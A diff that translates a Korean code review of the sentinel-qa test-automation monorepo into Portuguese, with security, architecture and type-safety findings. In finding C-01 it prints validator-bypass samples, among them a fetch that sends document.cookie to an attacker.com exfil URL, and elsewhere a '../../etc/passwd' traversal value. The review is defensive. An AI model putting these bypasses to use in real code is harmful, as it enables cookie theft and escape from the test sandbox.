@@ -1,18 +1,18 @@
-# Code Review Report: sentinel-qa 전체 코드베이스
+# Code Review Report: Codebase completa do sentinel-qa
 
-**날짜**: 2026-03-31
-**리뷰어**: Senior Code Review Agent (Architect-level)
-**범위**: packages/mcp-server, packages/playwright-runner, packages/maestro-bridge, registry/
-**커밋**: e6ccbbe (HEAD, main)
-**목적**: standalone agent 리팩토링 전, 유지되는 모듈 중심의 품질 점검
+**Data**: 2026-03-31
+**Revisor**: Senior Code Review Agent (nível Architect)
+**Escopo**: packages/mcp-server, packages/playwright-runner, packages/maestro-bridge, registry/
+**Commit**: e6ccbbe (HEAD, main)
+**Objetivo**: checagem de qualidade focada nos módulos que serão mantidos, antes do refactor para standalone agent
 
 ---
 
-## 요약
+## Resumo
 
-sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있다. 모듈 경계가 명확하고, 테스트 코드 보안 검증(validator.ts)이 존재하며, 테스트 커버리지도 핵심 모듈에 대해 충분하다. 그러나 **보안 검증의 우회 가능성**, **run-tests.ts의 God Function 문제**, **YAML 로딩 시 검증 부재**, **race condition 위험** 등 리팩토링 전 반드시 해결해야 할 이슈가 존재한다.
+Para um projeto em estágio inicial, o sentinel-qa tem uma arquitetura bem organizada. Os limites entre módulos são claros, existe validação de segurança do código de teste (`validator.ts`), e a cobertura de testes é suficiente nos módulos centrais. Ainda assim, existem issues que precisam ser resolvidos antes do refactor: **possibilidade de bypass da validação de segurança**, **problema de God Function em `run-tests.ts`**, **ausência de validação ao carregar YAML**, e **risco de race condition**.
 
-| 심각도 | 건수 |
+| Severidade | Quantidade |
 |--------|------|
 | CRITICAL | 2 |
 | HIGH | 5 |
@@ -22,32 +22,32 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
 
 ---
 
-## Critical & High Priority Findings
+## Findings Críticos e de Alta Prioridade
 
-### [C-01] 테스트 코드 Validator 우회 가능성 (Security)
-- **심각도**: CRITICAL
-- **카테고리**: Security
-- **파일**: `packages/playwright-runner/src/validator.ts:7-30`
-- **이슈**: 정규식 기반 blocklist는 난독화로 쉽게 우회 가능하다. 예를 들어:
+### [C-01] Possibilidade de Bypass do Validator de Código de Teste (Security)
+- **Severidade**: CRITICAL
+- **Categoria**: Security
+- **Arquivo**: `packages/playwright-runner/src/validator.ts:7-30`
+- **Issue**: A blocklist baseada em regex pode ser facilmente contornada por ofuscação. Por exemplo:
   ```typescript
-  // 우회 예시 1: 문자열 결합
+  // Bypass exemplo 1: concatenação de string
   const e = 'ev' + 'al';
   globalThis[e]('malicious code');
 
-  // 우회 예시 2: Playwright의 page.evaluate() 내부에서 임의 코드 실행
+  // Bypass exemplo 2: execução de código arbitrário dentro do page.evaluate() do Playwright
   await page.evaluate(() => {
-    // 여기서는 브라우저 context이므로 Node.js 제한이 무의미
+    // aqui é o contexto do navegador, então as restrições do Node.js não têm efeito
     fetch('https://attacker.com/exfil?data=' + document.cookie);
   });
 
-  // 우회 예시 3: 간접 접근
+  // Bypass exemplo 3: acesso indireto
   const p = process;
   p['ex' + 'it'](1);
   ```
-- **영향**: pilot-ai가 생성한 테스트 코드가 악의적이거나 잘못된 경우, 호스트 시스템에서 임의 코드 실행 가능
-- **권장사항**:
+- **Impacto**: se o código de teste gerado pelo pilot-ai for malicioso ou incorreto, é possível executar código arbitrário no sistema host
+- **Recomendação**:
   ```typescript
-  // 1단계: AST 기반 검증으로 전환 (typescript compiler API 활용)
+  // Etapa 1: migrar para validação baseada em AST (usando a TypeScript compiler API)
   import ts from 'typescript';
 
   function validateWithAST(code: string): ValidationResult {
@@ -55,14 +55,14 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
     const errors: string[] = [];
 
     function visit(node: ts.Node) {
-      // CallExpression 검사 — eval, Function, require 등
+      // Verifica CallExpression — eval, Function, require etc.
       if (ts.isCallExpression(node)) {
         const name = node.expression.getText(sourceFile);
         if (BLOCKED_CALL_NAMES.has(name)) {
           errors.push(`${name}() is not allowed`);
         }
       }
-      // ImportDeclaration 검사
+      // Verifica ImportDeclaration
       if (ts.isImportDeclaration(node)) {
         const specifier = (node.moduleSpecifier as ts.StringLiteral).text;
         if (!ALLOWED_MODULES.has(specifier)) {
@@ -75,58 +75,58 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
     return { valid: errors.length === 0, errors };
   }
 
-  // 2단계: (장기) 격리된 sandbox 환경에서 실행 (Docker container, VM)
+  // Etapa 2: (longo prazo) executar em um sandbox isolado (container Docker, VM)
   ```
 
-### [C-02] Maestro Bridge에서 appId 커맨드 인젝션 위험 (Security)
-- **심각도**: CRITICAL
-- **카테고리**: Security
-- **파일**: `packages/maestro-bridge/src/runner.ts:120-126`
-- **이슈**: `appId` 값이 `spawn`의 `args` 배열로 전달되므로 shell injection은 아니지만, `filePath`는 사용자 제공 `test.id`로부터 구성된다(line 49). `test.id`에 `../` 같은 경로 조작 문자가 있으면 temp directory 밖에 파일을 쓸 수 있다.
+### [C-02] Risco de Command Injection via appId no Maestro Bridge (Security)
+- **Severidade**: CRITICAL
+- **Categoria**: Security
+- **Arquivo**: `packages/maestro-bridge/src/runner.ts:120-126`
+- **Issue**: o valor de `appId` é passado como array de `args` do `spawn`, então não é shell injection propriamente dito, mas o `filePath` é construído a partir do `test.id` fornecido pelo usuário (linha 49). Se `test.id` contiver caracteres de manipulação de caminho como `../`, é possível escrever um arquivo fora do diretório temporário.
   ```typescript
-  // runner.ts:49 — test.id가 검증 없이 파일 경로로 사용
+  // runner.ts:49 — test.id usado como caminho de arquivo sem validação
   const filePath = join(tempDir, `${test.id}.yaml`);
   ```
-- **영향**: Path traversal로 시스템 임의 위치에 YAML 파일 작성 가능
-- **권장사항**:
+- **Impacto**: path traversal permite escrever arquivos YAML em posições arbitrárias do sistema
+- **Recomendação**:
   ```typescript
   import { basename } from 'node:path';
 
-  // test.id를 파일명으로 사용하기 전 sanitize
+  // sanitizar o test.id antes de usá-lo como nome de arquivo
   function sanitizeId(id: string): string {
-    // 경로 구분자 제거, 알파벳/숫자/하이픈/언더스코어만 허용
+    // remove separadores de caminho, permite só alfanumérico/hífen/underscore
     return id.replace(/[^a-zA-Z0-9_-]/g, '_');
   }
 
   const safeId = sanitizeId(test.id);
   const filePath = join(tempDir, `${safeId}.yaml`);
 
-  // 결과 경로가 tempDir 내부인지 확인
+  // confirma que o caminho resultante está dentro do tempDir
   if (!filePath.startsWith(tempDir)) {
     throw new Error(`Invalid test ID: path traversal detected`);
   }
   ```
 
-### [H-01] run-tests.ts God Function — 260줄 단일 함수 (Architecture)
-- **심각도**: HIGH
-- **카테고리**: Architecture & Design
-- **파일**: `packages/mcp-server/src/tools/run-tests.ts:15-261`
-- **이슈**: `registerRunTests` 내부 콜백이 260줄에 달하며 다음 책임을 모두 포함한다:
-  1. 격리 필터링 (quarantine)
-  2. 플랫폼 결정
-  3. 플랫폼별 테스트 필터링
-  4. Playwright 실행 + 결과 처리
-  5. Maestro 실행 + 결과 변환
-  6. 이벤트 검증
-  7. 리포트 저장
-  8. JSON 응답 구성
-- **영향**: 단독 에이전트 전환 시 이 코드를 분리하지 않으면 유지보수가 극히 어려워진다. 현재도 web/flutter 로직이 중복되어 있다 (status record, report save 로직이 두 번 반복).
-- **권장사항**:
+### [H-01] God Function em run-tests.ts — função única de 260 linhas (Architecture)
+- **Severidade**: HIGH
+- **Categoria**: Architecture & Design
+- **Arquivo**: `packages/mcp-server/src/tools/run-tests.ts:15-261`
+- **Issue**: o callback interno de `registerRunTests` chega a 260 linhas e concentra todas estas responsabilidades:
+  1. Filtro de quarantine
+  2. Determinação de plataforma
+  3. Filtro de testes por plataforma
+  4. Execução do Playwright + processamento do resultado
+  5. Execução do Maestro + conversão do resultado
+  6. Validação de eventos
+  7. Salvamento do relatório
+  8. Montagem da resposta JSON
+- **Impacto**: se esse código não for separado antes da migração para o standalone agent, a manutenção fica extremamente difícil. Já hoje há duplicação entre a lógica de web/flutter (o registro de status e o salvamento de relatório se repetem duas vezes).
+- **Recomendação**:
   ```typescript
-  // 역할별 분리
-  // 1. TestFilterService — quarantine, platform 필터링
-  // 2. TestOrchestrator — 플랫폼 라우팅 + 실행 조율
-  // 3. ResultProcessor — 상태 기록, 이벤트 검증, 리포트 저장
+  // Separar por responsabilidade
+  // 1. TestFilterService — filtro de quarantine e de plataforma
+  // 2. TestOrchestrator — roteamento de plataforma + coordenação da execução
+  // 3. ResultProcessor — registro de status, validação de eventos, salvamento do relatório
 
   class TestOrchestrator {
     constructor(
@@ -147,50 +147,50 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
   }
   ```
 
-### [H-02] YAML 로딩 시 런타임 검증 부재 (Type Safety)
-- **심각도**: HIGH
-- **카테고리**: Type Safety / Security
-- **파일**: `packages/mcp-server/src/utils/yaml-loader.ts:4-7`
-- **이슈**: `loadYaml<T>` 함수가 `as T` 타입 단언만 하고 실제 런타임 검증을 하지 않는다. YAML 파일이 기대 스키마와 다르면 런타임에 `undefined` 접근 에러가 발생한다.
+### [H-02] Ausência de Validação em Tempo de Execução ao Carregar YAML (Type Safety)
+- **Severidade**: HIGH
+- **Categoria**: Type Safety / Security
+- **Arquivo**: `packages/mcp-server/src/utils/yaml-loader.ts:4-7`
+- **Issue**: a função `loadYaml<T>` só faz uma asserção de tipo `as T`, sem validação real em tempo de execução. Se o arquivo YAML não corresponder ao schema esperado, ocorre um erro de acesso a `undefined` em tempo de execução.
   ```typescript
-  // 현재: 위험한 타입 단언
+  // Atual: asserção de tipo perigosa
   export async function loadYaml<T>(filePath: string): Promise<T> {
     const content = await readFile(filePath, 'utf-8');
-    return parse(content) as T;  // 실제 T인지 검증 없음
+    return parse(content) as T;  // sem validação de que realmente é T
   }
   ```
-- **영향**: 잘못된 YAML 파일이 조용히 로딩되어 후속 처리에서 cryptic한 에러 발생
-- **권장사항**:
+- **Impacto**: um YAML incorreto é carregado silenciosamente e gera erros crípticos no processamento seguinte
+- **Recomendação**:
   ```typescript
   import { z, ZodSchema } from 'zod';
 
   export async function loadYaml<T>(filePath: string, schema: ZodSchema<T>): Promise<T> {
     const content = await readFile(filePath, 'utf-8');
     const raw = parse(content);
-    return schema.parse(raw);  // 런타임 검증 + 타입 안전성
+    return schema.parse(raw);  // validação em runtime + segurança de tipo
   }
 
-  // 사용:
+  // Uso:
   const config = await loadYaml(appsPath, appsConfigSchema);
   ```
-  참고: `event-validation/schema.ts`에 이미 Zod 스키마가 있으므로, 이를 `loadYaml`에 통합하면 된다.
+  Nota: `event-validation/schema.ts` já tem schemas Zod definidos, bastando integrá-los ao `loadYaml`.
 
-### [H-03] TestStatusStore의 Race Condition (Error Handling / Resilience)
-- **심각도**: HIGH
-- **카테고리**: Error Handling & Resilience
-- **파일**: `packages/mcp-server/src/store/test-status-store.ts:54-97`
-- **이슈**: `recordRun`이 load → modify → save 패턴을 사용하는데, 동시에 여러 테스트 결과가 기록되면 마지막 writer가 이전 결과를 덮어쓴다. `run-tests.ts:105-107`에서 순차 `await`이긴 하지만, 향후 병렬화하면 즉시 문제된다.
+### [H-03] Race Condition no TestStatusStore (Error Handling / Resilience)
+- **Severidade**: HIGH
+- **Categoria**: Error Handling & Resilience
+- **Arquivo**: `packages/mcp-server/src/store/test-status-store.ts:54-97`
+- **Issue**: `recordRun` usa o padrão load → modify → save. Se vários resultados de teste forem gravados simultaneamente, o último writer sobrescreve os resultados anteriores. Em `run-tests.ts:105-107` a execução hoje é sequencial (`await` em loop), mas isso se torna um problema imediato assim que houver paralelização.
   ```typescript
-  // run-tests.ts:105-107 — 현재는 순차이지만 위험
+  // run-tests.ts:105-107 — sequencial hoje, mas arriscado
   for (const testResult of result.tests) {
     await statusStore.recordRun(app_id, testResult.id, testResult.status === 'passed');
-    // 매번 전체 파일을 읽고 다시 쓴다 — O(n^2) I/O
+    // lê e reescreve o arquivo inteiro a cada iteração — I/O O(n²)
   }
   ```
-- **영향**: N개 테스트 결과 기록 시 N번의 파일 읽기/쓰기 발생 (비효율). 병렬 실행 시 데이터 손실.
-- **권장사항**:
+- **Impacto**: gravar N resultados de teste gera N leituras/escritas de arquivo (ineficiente). Em execução paralela, há perda de dados.
+- **Recomendação**:
   ```typescript
-  // 1. 배치 기록 메서드 추가
+  // 1. Adicionar um método de gravação em lote
   async recordBatch(appId: string, results: Array<{testId: string; passed: boolean}>): Promise<TestStatus[]> {
     const statuses = await this.load(appId);
     const updated: TestStatus[] = [];
@@ -201,67 +201,67 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
         entry = { id: testId, status: 'new', passRate: 0, runHistory: [], lastRun: '' };
         statuses.push(entry);
       }
-      // ... update logic
+      // ... lógica de atualização
       updated.push(entry);
     }
 
-    await this.save(appId, statuses);  // 한 번만 쓴다
+    await this.save(appId, statuses);  // escreve uma única vez
     return updated;
   }
 
-  // 2. 장기적으로는 파일 잠금 또는 SQLite로 전환
+  // 2. No longo prazo, migrar para file locking ou SQLite
   ```
 
-### [H-04] Playwright Runner에서 test.id Path Traversal (Security)
-- **심각도**: HIGH
-- **카테고리**: Security
-- **파일**: `packages/playwright-runner/src/runner.ts:164-167`
-- **이슈**: C-02와 동일한 패턴. 인덱스 기반으로 파일명을 생성하므로 현재는 안전하지만, `parseJsonReport`에서 `test-${i}.spec.ts` 매핑이 `idMap`을 통해 이루어지므로 일관성을 유지해야 한다.
+### [H-04] Path Traversal via test.id no Playwright Runner (Security)
+- **Severidade**: HIGH
+- **Categoria**: Security
+- **Arquivo**: `packages/playwright-runner/src/runner.ts:164-167`
+- **Issue**: mesmo padrão do C-02. O nome do arquivo é gerado com base no índice, então hoje é seguro, mas o mapeamento `test-${i}.spec.ts` em `parseJsonReport` depende do `idMap`, então a consistência precisa ser mantida.
   ```typescript
-  // 현재는 안전 (인덱스 사용)
+  // Seguro hoje (usa índice)
   const fileName = `test-${i}.spec.ts`;
   ```
-  그러나 향후 `test.id`를 파일명에 포함하면 즉시 취약해진다.
-- **영향**: 현재 안전하나, 리팩토링 시 실수할 위험이 높음
-- **권장사항**: 방어적으로 sanitize 함수를 추가하고 문서화
+  Porém, se `test.id` passar a fazer parte do nome do arquivo no futuro, isso se torna vulnerável imediatamente.
+- **Impacto**: seguro hoje, mas alto risco de erro em um refactor futuro
+- **Recomendação**: adicionar uma função de sanitize por precaução e documentar o motivo
 
-### [H-05] Event Validation이 항상 빈 배열로 호출됨 (Data Flow)
-- **심각도**: HIGH
-- **카테고리**: Data Flow / Dead Code
-- **파일**: `packages/mcp-server/src/tools/run-tests.ts:121`
-- **이슈**: 이벤트 검증 로직이 존재하지만, `capturedEvents`가 항상 빈 배열이다:
+### [H-05] Event Validation Sempre Chamada com Array Vazio (Data Flow)
+- **Severidade**: HIGH
+- **Categoria**: Data Flow / Dead Code
+- **Arquivo**: `packages/mcp-server/src/tools/run-tests.ts:121`
+- **Issue**: a lógica de validação de eventos existe, mas `capturedEvents` está sempre vazio:
   ```typescript
-  const capturedEvents: CapturedEvent[] = [];  // 항상 비어 있음
+  const capturedEvents: CapturedEvent[] = [];  // sempre vazio
   eventValidation = validateEvents(eventSpec.events, capturedEvents);
-  // 결과: 모든 이벤트가 항상 'missing'
+  // resultado: todo evento aparece sempre como 'missing'
   ```
-  주석에 "will be fully integrated when the Playwright runner supports event capture"라고 되어 있지만, 현재 상태에서 `validate_events: true`로 호출하면 사용자가 잘못된 결과를 받게 된다.
-- **영향**: 사용자가 event validation 결과를 신뢰할 수 없음
-- **권장사항**: (A) `validate_events`가 true일 때 "not yet implemented" 경고를 반환하거나, (B) Playwright runner에 network interception을 구현하여 실제 이벤트를 캡처하도록 한다. standalone agent 전환 시 이 기능 완성을 우선시해야 한다.
+  O comentário no código diz "will be fully integrated when the Playwright runner supports event capture", mas, no estado atual, chamar com `validate_events: true` faz o usuário receber um resultado incorreto.
+- **Impacto**: o usuário não pode confiar no resultado da validação de eventos
+- **Recomendação**: (A) retornar um aviso de "not yet implemented" quando `validate_events` for `true`, ou (B) implementar interceptação de rede no Playwright runner para capturar os eventos de verdade. Na migração para standalone agent, completar essa funcionalidade deve ser prioridade.
 
 ---
 
-## Medium & Low Priority Findings
+## Findings de Média e Baixa Prioridade
 
-### [M-01] Playwright/Maestro 결과 타입 불일치 (Type Safety)
-- **심각도**: MEDIUM
-- **카테고리**: Type Safety
-- **파일**: `packages/mcp-server/src/tools/run-tests.ts:196-209`
-- **이슈**: Maestro 결과를 Playwright의 `RunResult` 타입으로 수동 변환하고 있다. 이는 두 runner의 공통 인터페이스가 없기 때문이다.
+### [M-01] Inconsistência de Tipos entre Resultados do Playwright/Maestro (Type Safety)
+- **Severidade**: MEDIUM
+- **Categoria**: Type Safety
+- **Arquivo**: `packages/mcp-server/src/tools/run-tests.ts:196-209`
+- **Issue**: o resultado do Maestro é convertido manualmente para o tipo `RunResult` do Playwright, porque não existe uma interface comum entre os dois runners.
   ```typescript
   const runResult: RunResult = {
     passed: maestroResult.passed,
     failed: maestroResult.failed,
-    skipped: 0,  // Maestro에는 없는 필드를 하드코딩
+    skipped: 0,  // campo inexistente no Maestro, hardcoded
     timedOut: 0,
     // ...
     tests: maestroResult.tests.map((t) => ({
-      // 'cancelled' → 'skipped' 변환
+      // conversão de 'cancelled' → 'skipped'
       status: t.status === 'cancelled' ? 'skipped' as const : t.status,
     })),
   };
   ```
-- **권장사항**: 공통 `TestRunResult` 인터페이스를 별도 패키지로 추출하고, 각 runner가 이를 구현하도록 한다.
+- **Recomendação**: extrair uma interface comum `TestRunResult` em um pacote separado, implementada por cada runner.
   ```typescript
   // packages/shared-types/src/index.ts
   export interface UnifiedRunResult {
@@ -274,12 +274,12 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
   }
   ```
 
-### [M-02] AppRegistry에서 Path Traversal 미검증 (Security)
-- **심각도**: MEDIUM
-- **카테고리**: Security
-- **파일**: `packages/mcp-server/src/registry/registry.ts:39,52`
-- **이슈**: `app.context.selectors`와 `app.context.event_spec`가 `resolve(this.registryDir, ...)`로 결합되는데, YAML 파일에 `../../etc/passwd` 같은 값이 있으면 registryDir 밖의 파일을 읽을 수 있다.
-- **권장사항**:
+### [M-02] Path Traversal não Validado no AppRegistry (Security)
+- **Severidade**: MEDIUM
+- **Categoria**: Security
+- **Arquivo**: `packages/mcp-server/src/registry/registry.ts:39,52`
+- **Issue**: `app.context.selectors` e `app.context.event_spec` são combinados via `resolve(this.registryDir, ...)`. Se o arquivo YAML tiver um valor como `../../etc/passwd`, é possível ler arquivos fora do registryDir.
+- **Recomendação**:
   ```typescript
   const resolvedPath = resolve(this.registryDir, relativePath);
   if (!resolvedPath.startsWith(this.registryDir)) {
@@ -287,12 +287,12 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
   }
   ```
 
-### [M-03] Logger에 구조화된 로깅 부재 (Code Quality)
-- **심각도**: MEDIUM
-- **카테고리**: Code Quality
-- **파일**: `packages/mcp-server/src/utils/logger.ts`
-- **이슈**: `console.error`에 spread arguments를 전달하면 JSON 구조 로그가 아닌 비구조적 출력이 된다. standalone agent에서는 로그 파싱이 필요할 수 있다.
-- **권장사항**: 최소한 timestamp와 level을 포함하는 구조화된 포맷을 적용
+### [M-03] Ausência de Logging Estruturado no Logger (Code Quality)
+- **Severidade**: MEDIUM
+- **Categoria**: Code Quality
+- **Arquivo**: `packages/mcp-server/src/utils/logger.ts`
+- **Issue**: passar spread arguments para `console.error` produz uma saída não estruturada, em vez de um log JSON estruturado. No standalone agent, pode ser necessário fazer parsing dos logs.
+- **Recomendação**: aplicar um formato estruturado incluindo pelo menos timestamp e level
   ```typescript
   export const logger = {
     info: (...args: unknown[]) =>
@@ -301,80 +301,80 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
   };
   ```
 
-### [M-04] capture-patterns.ts의 silent error swallowing (Error Handling)
-- **심각도**: MEDIUM
-- **카테고리**: Error Handling
-- **파일**: `packages/mcp-server/src/event-validation/capture-patterns.ts:38,59,79,105`
-- **이슈**: 모든 파서에서 `catch { /* ignore parse errors */ }` 패턴을 사용한다. 파싱 실패 시 빈 배열을 반환하므로 이벤트가 누락되어도 사용자에게 알림이 없다.
-- **권장사항**: 최소한 debug 로그를 남기거나, 파싱 실패 이벤트를 별도 카운터로 추적
+### [M-04] Silenciamento de Erros em capture-patterns.ts (Error Handling)
+- **Severidade**: MEDIUM
+- **Categoria**: Error Handling
+- **Arquivo**: `packages/mcp-server/src/event-validation/capture-patterns.ts:38,59,79,105`
+- **Issue**: todos os parsers usam o padrão `catch { /* ignore parse errors */ }`. Quando o parsing falha, retorna um array vazio, então o usuário não é avisado quando eventos são perdidos.
+- **Recomendação**: pelo menos registrar um log de debug, ou rastrear falhas de parsing em um contador separado
 
-### [M-05] ReportStore.getLatest에서 JSON 파싱 타입 미검증 (Type Safety)
-- **심각도**: MEDIUM
-- **카테고리**: Type Safety
-- **파일**: `packages/mcp-server/src/report/report-store.ts:79-80`
-- **이슈**: `JSON.parse(raw)`의 결과가 검증 없이 `RunResult & { meta: ReportMeta }`로 반환된다. 파일이 손상되었거나 스키마가 변경된 경우 런타임 에러 발생.
-- **권장사항**: Zod 스키마로 파싱 결과를 검증하거나, 최소한 필수 필드 존재 여부를 확인
+### [M-05] Resultado do JSON.parse não Validado em ReportStore.getLatest (Type Safety)
+- **Severidade**: MEDIUM
+- **Categoria**: Type Safety
+- **Arquivo**: `packages/mcp-server/src/report/report-store.ts:79-80`
+- **Issue**: o resultado de `JSON.parse(raw)` é retornado como `RunResult & { meta: ReportMeta }` sem validação. Se o arquivo estiver corrompido ou o schema tiver mudado, ocorre um erro em tempo de execução.
+- **Recomendação**: validar o resultado do parsing com um schema Zod, ou pelo menos checar a existência dos campos obrigatórios
 
-### [M-06] Maestro Runner의 순차 실행 (Performance)
-- **심각도**: MEDIUM
-- **카테고리**: Performance
-- **파일**: `packages/maestro-bridge/src/runner.ts:58-82`
-- **이슈**: 모든 Maestro 테스트가 순차적으로 실행된다. 독립적인 테스트의 경우 병렬 실행이 가능하다.
-- **권장사항**: `concurrency` 옵션을 추가하여 병렬 실행 지원. 단, Maestro CLI가 디바이스를 공유하므로 디바이스 pool 관리가 필요.
+### [M-06] Execução Sequencial no Maestro Runner (Performance)
+- **Severidade**: MEDIUM
+- **Categoria**: Performance
+- **Arquivo**: `packages/maestro-bridge/src/runner.ts:58-82`
+- **Issue**: todos os testes do Maestro são executados sequencialmente. Testes independentes poderiam rodar em paralelo.
+- **Recomendação**: adicionar uma opção `concurrency` para suportar execução paralela. Como a CLI do Maestro compartilha o dispositivo, é necessário gerenciar um pool de dispositivos.
 
-### [M-07] TestStore가 인메모리 전용 (Architecture)
-- **심각도**: MEDIUM
-- **카테고리**: Architecture
-- **파일**: `packages/mcp-server/src/store/test-store.ts`
-- **이슈**: `TestStore`는 순수 인메모리 `Map`이다. 프로세스 재시작 시 저장된 테스트가 모두 사라진다. `TestStatusStore`는 파일 기반인데 `TestStore`만 인메모리인 것은 비일관적이다.
-- **권장사항**: standalone agent에서는 `TestStore`도 파일 기반 또는 SQLite로 전환을 고려
+### [M-07] TestStore é Apenas em Memória (Architecture)
+- **Severidade**: MEDIUM
+- **Categoria**: Architecture
+- **Arquivo**: `packages/mcp-server/src/store/test-store.ts`
+- **Issue**: `TestStore` é um `Map` puramente em memória. Ao reiniciar o processo, todos os testes salvos são perdidos. É inconsistente que `TestStatusStore` seja baseado em arquivo enquanto só o `TestStore` fica em memória.
+- **Recomendação**: no standalone agent, considerar migrar `TestStore` também para arquivo ou SQLite
 
-### [L-01] Playwright Runner의 progress 파싱이 부정확 (Code Quality)
-- **심각도**: LOW
-- **카테고리**: Code Quality
-- **파일**: `packages/playwright-runner/src/runner.ts:260-275`
-- **이슈**: stderr 누적 문자열에서 progress를 역순으로 찾는 로직이 있지만, `total`이 항상 `-1`로 전달된다.
+### [L-01] Parsing de Progress Impreciso no Playwright Runner (Code Quality)
+- **Severidade**: LOW
+- **Categoria**: Code Quality
+- **Arquivo**: `packages/playwright-runner/src/runner.ts:260-275`
+- **Issue**: existe uma lógica que busca o progress de trás para frente na string acumulada de stderr, mas `total` é sempre passado como `-1`.
   ```typescript
   options.onProgress(current, -1, progressLine.trim());  // total = -1 ???
   ```
-- **권장사항**: total을 정확히 전달하거나, progress 타입에서 optional로 변경
+- **Recomendação**: passar o total corretamente, ou tornar o campo opcional no tipo de progress
 
-### [L-02] 미사용 startTime 변수 (Dead Code)
-- **심각도**: LOW
-- **카테고리**: Code Quality
-- **파일**: `packages/maestro-bridge/src/parser.ts:19`
-- **이슈**: `const startTime = Date.now();`가 선언되었지만 사용되지 않는다.
-- **권장사항**: 제거
+### [L-02] Variável startTime não Utilizada (Dead Code)
+- **Severidade**: LOW
+- **Categoria**: Code Quality
+- **Arquivo**: `packages/maestro-bridge/src/parser.ts:19`
+- **Issue**: `const startTime = Date.now();` é declarada mas nunca usada.
+- **Recomendação**: remover
 
-### [L-03] Registry의 동기적 existsSync 사용 (Performance)
-- **심각도**: LOW
-- **카테고리**: Performance
-- **파일**: `packages/mcp-server/src/registry/registry.ts:17,40,50`, `packages/mcp-server/src/report/report-store.ts:59,74`
-- **이슈**: 비동기 코드 내에서 `existsSync`를 사용한다. Event loop을 블로킹한다.
-- **권장사항**: `access(path, constants.F_OK)`로 대체하거나, try-catch로 `readFile`을 감싸서 ENOENT를 처리 (이미 TestStatusStore에서 이 패턴을 사용 중)
+### [L-03] Uso Síncrono de existsSync no Registry (Performance)
+- **Severidade**: LOW
+- **Categoria**: Performance
+- **Arquivo**: `packages/mcp-server/src/registry/registry.ts:17,40,50`, `packages/mcp-server/src/report/report-store.ts:59,74`
+- **Issue**: `existsSync` é usado dentro de código assíncrono, bloqueando o event loop.
+- **Recomendação**: substituir por `access(path, constants.F_OK)`, ou envolver `readFile` em try-catch tratando ENOENT (padrão já usado no TestStatusStore)
 
-### [L-04] matchAnalyticsUrl의 단순 substring matching (Code Quality)
-- **심각도**: LOW
-- **카테고리**: Code Quality
-- **파일**: `packages/mcp-server/src/event-validation/capture-patterns.ts:152-163`
-- **이슈**: glob 패턴을 단순 substring matching으로 처리한다. `google-analytics.com`이 URL 어디에든 있으면 매칭되므로 false positive 가능.
-- **권장사항**: `micromatch` 또는 `picomatch` 라이브러리로 정확한 glob matching 수행, 또는 `URL` 파싱 후 hostname 기반 매칭
+### [L-04] Matching por Substring Simples em matchAnalyticsUrl (Code Quality)
+- **Severidade**: LOW
+- **Categoria**: Code Quality
+- **Arquivo**: `packages/mcp-server/src/event-validation/capture-patterns.ts:152-163`
+- **Issue**: padrões glob são tratados como simples matching de substring. Se `google-analytics.com` aparecer em qualquer parte da URL, o match ocorre, gerando falsos positivos.
+- **Recomendação**: usar as bibliotecas `micromatch` ou `picomatch` para matching de glob preciso, ou fazer parsing via `URL` e comparar pelo hostname
 
 ---
 
-## Info
+## Informativo
 
-### [I-01] Zod 3.x 제약 문서화
-- **카테고리**: Project Compliance
-- CLAUDE.md에 "Zod 3.x — MCP SDK compatibility"로 명시되어 있으나, `package.json`에는 `"zod": "^3.24.4"`로만 되어 있다. MCP SDK 업데이트 시 Zod 4 호환성 확인 필요.
+### [I-01] Documentação da Restrição do Zod 3.x
+- **Categoria**: Project Compliance
+- O CLAUDE.md declara "Zod 3.x — MCP SDK compatibility", mas o `package.json` só tem `"zod": "^3.24.4"`. É necessário confirmar a compatibilidade com o Zod 4 quando o MCP SDK for atualizado.
 
-### [I-02] lint 스크립트 미구현
-- **카테고리**: Code Quality
-- 모든 패키지의 lint 스크립트가 `echo "No lint yet"`이다. ESLint + strict TypeScript 규칙 도입을 권장한다.
+### [I-02] Script de Lint não Implementado
+- **Categoria**: Code Quality
+- Em todos os pacotes, o script de lint é apenas `echo "No lint yet"`. Recomenda-se adotar ESLint + regras estritas de TypeScript.
 
-### [I-03] 타입 안전성을 위한 Branded Types 고려
-- **카테고리**: Type Safety
-- `appId`, `testId` 같은 식별자가 모두 `string` 타입이다. Branded types를 사용하면 잘못된 ID를 전달하는 실수를 컴파일 타임에 방지할 수 있다.
+### [I-03] Considerar Branded Types para Segurança de Tipos
+- **Categoria**: Type Safety
+- Identificadores como `appId` e `testId` são todos do tipo `string`. Usar branded types evita, em tempo de compilação, o erro de passar um ID incorreto.
   ```typescript
   type AppId = string & { readonly __brand: 'AppId' };
   type TestId = string & { readonly __brand: 'TestId' };
@@ -382,49 +382,49 @@ sentinel-qa는 초기 프로젝트 치고 아키텍처가 잘 정돈되어 있�
 
 ---
 
-## 긍정적 관찰
+## Observações Positivas
 
-1. **보안 의식이 높다**: Playwright validator가 존재하고 블록 패턴이 포괄적이다. `console.log` 금지 규칙도 잘 지켜지고 있다.
-2. **테스트 품질이 우수하다**: event-validation, test-status-store, validator, parse-report, parser 등 핵심 모듈에 대해 다양한 케이스를 커버하는 테스트가 있다. 특히 boundary case (empty arrays, unmatched flows)도 테스트한다.
-3. **MCP tool registration 패턴이 깔끔하다**: 각 tool이 별도 파일로 분리되어 있고, dependency injection으로 결합도가 낮다.
-4. **Cancellation 지원이 잘 구현되어 있다**: AbortSignal을 통한 취소가 Playwright runner와 Maestro bridge 모두에서 지원된다.
-5. **TestStatusStore의 quarantine 시스템이 잘 설계되어 있다**: 5회 윈도우 기반 promote/demote 로직이 명확하고 테스트도 충분하다.
-6. **ESM-only 규칙이 일관되게 적용되어 있다**: 모든 import에 `.js` 확장자가 사용되고, `"type": "module"`이 설정되어 있다.
-
----
-
-## Standalone Agent 전환 시 우선순위 Action Items
-
